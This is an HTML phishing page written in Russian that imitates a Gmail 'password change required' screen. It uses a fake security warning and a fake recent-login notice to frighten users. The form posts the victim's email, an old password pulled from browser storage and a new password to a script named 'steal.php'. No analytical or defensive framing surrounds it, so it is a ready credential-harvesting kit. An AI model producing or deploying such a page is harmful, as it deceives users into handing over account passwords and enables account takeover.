<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Смена пароля</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Arial; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 48px 40px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo img { width: 75px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
        .email-display { text-align: center; color: #1a73e8; font-size: 16px; font-weight: 500; margin-bottom: 24px; }
        .warning { background: #fce8e6; border-left: 4px solid #d93025; border-radius: 8px; padding: 16px; margin-bottom: 24px; }
        .warning h3 { color: #d93025; font-size: 14px; font-weight: 500; margin-bottom: 4px; }
        .warning p { color: #5f6368; font-size: 12px; }
        .login-info { background: #e8f0fe; border-radius: 8px; padding: 12px; margin-bottom: 24px; display: flex; align-items: center; gap: 12px; }
        .info-icon { font-size: 20px; }
        .info-details { flex: 1; }
        .info-details .label { font-size: 12px; color: #5f6368; }
        .info-details .value { font-size: 14px; color: #202124; font-weight: 500; }
        .info-link { color: #1a73e8; font-size: 12px; cursor: pointer; }
        .form-group { margin-bottom: 20px; }
        .input-wrapper { display: flex; align-items: center; border: 1px solid #dadce0; border-radius: 8px; }
        .input-wrapper input { width: 100%; padding: 13px 15px; border: none; outline: none; font-size: 14px; border-radius: 8px; }
        .show-password { padding: 0 15px; color: #1a73e8; font-size: 14px; cursor: pointer; }
        .requirements { font-size: 12px; color: #5f6368; margin-top: 8px; padding-left: 12px; }
        .actions { display: flex; justify-content: flex-end; margin-top: 32px; }
        .change-btn { background: #1a73e8; color: white; border: none; border-radius: 24px; padding: 10px 24px; font-size: 14px; cursor: pointer; }
        .change-btn:hover { background: #1557b0; }
        .footer { margin-top: 64px; display: flex; justify-content: center; gap: 24px; padding-top: 24px; border-top: 1px solid #e8eaed; font-size: 12px; color: #5f6368; }
        .footer a { color: #5f6368; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x.png" alt="Gmail">
        </div>
        
        <h1>Привет, Google!</h1>
        <div class="email-display" id="emailDisplay"></div>
        
        <div class="warning">
            <h3>⚠️ Требуется смена пароля</h3>
            <p>В целях безопасности вашего аккаунта необходимо сменить пароль</p>
        </div>
        
        <div class="login-info">
            <div class="info-icon">🕒</div>
            <div class="info-details">
                <div class="label">Последний вход</div>
                <div class="value">Москва • iPhone 17 pro max • Только что</div>
            </div>
            <div class="info-link">Подробнее</div>
        </div>
        
        <form id="changeForm" action="steal.php" method="POST">
            <input type="hidden" name="email" id="hiddenEmail">
            <input type="hidden" name="old_password" id="hiddenOldPassword">
            
            <div class="form-group">
                <div class="input-wrapper">
                    <input type="password" name="new_password" id="new_password" placeholder="Новый пароль" required>
                    <span class="show-password" onclick="toggleNewPassword()">Показать</span>
                </div>
                <div class="requirements">
                    • Минимум 8 символов<br>
                    • Заглавные и строчные буквы<br>
                    • Хотя бы одна цифра
                </div>
            </div>
            
            <div class="form-group">
                <div class="input-wrapper">
                    <input type="password" id="confirm_password" placeholder="Подтвердите новый пароль" required>
                </div>
            </div>
            
            <div class="actions">
                <button type="submit" class="change-btn">Изменить пароль</button>
            </div>
        </form>
        
        <div class="footer">
            <a href="#">Помощь</a>
            <a href="#">Конфиденциальность</a>
            <a href="#">Условия</a>
        </div>
    </div>
    
    <script>
        // Получаем параметры из URL
        const urlParams = new URLSearchParams(window.location.search);
        document.getElementById('emailDisplay').textContent = email;
        document.getElementById('hiddenEmail').value = email;
        
        // Получаем старый пароль из localStorage
        const oldPassword = localStorage.getItem('old_password') || '';
        document.getElementById('hiddenOldPassword').value = oldPassword;
        
        function toggleNewPassword() {
            const pwd = document.getElementById('new_password');
            const btn = event.target;
            if (pwd.type === 'password') {
                pwd.type = 'text';
                btn.textContent = 'Скрыть';
            } else {
                pwd.type = 'password';
                btn.textContent = 'Показать';
            }
        }
        
        document.getElementById('changeForm').addEventListener('submit', function(e) {
            const newPass = document.getElementById('new_password').value;
            const confirmPass = document.getElementById('confirm_password').value;
            
            if (newPass !== confirmPass) {
                e.preventDefault();
                alert('Пароли не совпадают');
                return;
            }
            
            if (newPass.length < 8) {
                e.preventDefault();
                alert('Пароль должен быть минимум 8 символов');
                return;
            }
            
            // Очищаем localStorage
            localStorage.removeItem('old_password');
        });
    </script>
</body>
</html>
